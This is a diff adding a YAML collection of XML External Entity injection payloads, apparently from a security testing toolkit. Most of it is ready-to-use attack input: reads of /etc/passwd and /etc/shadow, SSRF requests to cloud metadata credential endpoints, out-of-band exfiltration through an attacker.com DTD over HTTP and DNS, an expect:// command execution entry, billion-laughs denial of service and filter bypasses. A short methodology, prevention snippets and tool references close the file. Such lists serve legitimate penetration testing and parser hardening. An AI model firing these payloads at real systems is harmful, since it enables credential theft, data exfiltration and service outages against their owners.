@@ -1,0 +1,270 @@
+# XML External Entity (XXE) Injection Payloads
+# OWASP A05:2025 - Injection
+
+payload_category: "xxe"
+owasp_2025: "A05"
+cwe: "CWE-611"
+severity: "CRITICAL"
+
+# ===== BASIC XXE (File Disclosure) =====
+xxe_basic:
+  linux:
+    - |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <foo>&xxe;</foo>
+    
+    - |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
+      <data>&xxe;</data>
+    
+    - |
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
+      <root><name>&xxe;</name></root>
+  
+  windows:
+    - |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
+      <foo>&xxe;</foo>
+    
+    - |
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]>
+      <data>&xxe;</data>
+
+# ===== SSRF via XXE =====
+xxe_ssrf:
+  internal_network:
+    - |
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">]>
+      <foo>&xxe;</foo>
+    
+    - |
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1/config">]>
+      <data>&xxe;</data>
+  
+  cloud_metadata:
+    aws:
+      - |
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
+        <foo>&xxe;</foo>
+    
+    azure:
+      - |
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">]>
+        <foo>&xxe;</foo>
+    
+    gcp:
+      - |
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">]>
+        <foo>&xxe;</foo>
+
+# ===== BLIND XXE (Out-of-Band) =====
+xxe_blind_oob:
+  dtd_exfiltration:
+    payload: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
+      <foo>test</foo>
+    
+  evil_dtd_content: |
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
+    %eval;
+    %exfil;
+  
+  dns_exfiltration:
+    payload: |
+      <!DOCTYPE foo [
+        <!ENTITY % file SYSTEM "file:///etc/hostname">
+        <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+        %dtd;
+      ]>
+      <foo>&send;</foo>
+    
+    evil_dtd: |
+      <!ENTITY % all "<!ENTITY send SYSTEM 'http://%file;.attacker.com/'>">
+      %all;
+
+# ===== ERROR-BASED XXE =====
+xxe_error_based:
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY % file SYSTEM "file:///etc/passwd">
+      <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+      %eval;
+      %error;
+    ]>
+    <foo>test</foo>
+
+# ===== XXE in SOAP =====
+xxe_soap:
+  - |
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <soapenv:Header/>
+      <soapenv:Body>
+        <data>&xxe;</data>
+      </soapenv:Body>
+    </soapenv:Envelope>
+
+# ===== XXE in SVG =====
+xxe_svg:
+  - |
+    <svg xmlns="http://www.w3.org/2000/svg">
+      <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <text>&xxe;</text>
+    </svg>
+  
+  - |
+    <?xml version="1.0" standalone="yes"?>
+    <!DOCTYPE svg [
+      <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+    ]>
+    <svg><text>&xxe;</text></svg>
+
+# ===== XXE in Office Documents =====
+xxe_docx:
+  description: "Office Open XML (.docx, .xlsx, .pptx) uses XML"
+  file: "word/document.xml"
+  payload: |
+    <!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+    <w:document>&xxe;</w:document>
+
+# ===== PARAMETER ENTITY XXE =====
+parameter_entity:
+  - |
+    <!DOCTYPE foo [
+      <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+      <!ENTITY callme "%xxe;">
+    ]>
+    <foo>&callme;</foo>
+
+# ===== XXE WITH PHP WRAPPERS =====
+xxe_php_wrappers:
+  php_filter:
+    - |
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+      ]>
+      <foo>&xxe;</foo>
+  
+  expect:
+    - |
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
+      <foo>&xxe;</foo>
+  
+  data:
+    - |
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain,Injected Data">]>
+      <foo>&xxe;</foo>
+
+# ===== DENIAL OF SERVICE (DOS) =====
+xxe_dos:
+  billion_laughs:
+    - |
+      <?xml version="1.0"?>
+      <!DOCTYPE lolz [
+        <!ENTITY lol "lol">
+        <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+        <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+        <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+        <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+        <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+      ]>
+      <lolz>&lol6;</lolz>
+  
+  external_entity_expansion:
+    - |
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "file:///dev/random">
+      ]>
+      <foo>&xxe;</foo>
+
+# ===== BYPASS TECHNIQUES =====
+xxe_bypass:
+  utf16_encoding:
+    - |
+      <?xml version="1.0" encoding="UTF-16"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <foo>&xxe;</foo>
+  
+  cdata:
+    - |
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <foo><![CDATA[&xxe;]]></foo>
+  
+  base64:
+    - |
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+      ]>
+      <foo>&xxe;</foo>
+
+# ===== TESTING METHODOLOGY =====
+testing_steps:
+  - "Identify XML input points (APIs, file uploads, SOAP)"
+  - "Test with basic file disclosure"
+  - "Try SSRF to internal services"
+  - "If blind, use out-of-band (OOB) techniques"
+  - "Test for error-based XXE"
+  - "Check Office documents for XXE"
+
+detection_patterns:
+  success:
+    - "root:x:0:0:" # /etc/passwd
+    - "<?xml" # File contents
+    - "HTTP request to attacker server" # OOB
+    - "Connection timeout" # SSRF to internal
+  
+  errors:
+    - "XML parsing error"
+    - "Entity reference loop"
+    - "External entity access denied"
+
+# ===== PREVENTION =====
+prevention:
+  parser_configuration:
+    - "Disable external entity resolution"
+    - "Disable DTD processing if not needed"
+    - "Use secure XML parsers"
+  
+  language_specific:
+    php: |
+      libxml_disable_entity_loader(true);
+    
+    java: |
+      factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
+      factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+      factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+    
+    python: |
+      from defusedxml.ElementTree import parse
+      tree = parse('file.xml')  # Safe parser
+    
+    dotnet: |
+      XmlReaderSettings settings = new XmlReaderSettings();
+      settings.DtdProcessing = DtdProcessing.Prohibit;
+  
+  general:
+    - "Use JSON instead of XML when possible"
+    - "Validate XML against XSD schema"
+    - "Whitelist allowed entities"
+    - "Patch XML libraries regularly"
+    - "Input validation and sanitization"
+
+# ===== TOOLS =====
+tools:
+  - "Burp Suite (with XXE plugin)"
+  - "XXEinjector"
+  - "OWASP ZAP"
+  - "oxml_xxe (for Office docs)"
+
+references:
+  - "OWASP Top 10:2025 A05"
+  - "CWE-611: XML External Entity"
+  - "CWE-827: Improper Control of Document Type"
+  - "PayloadsAllTheThings: XXE Injection"
+  - "PortSwigger XXE Tutorial"
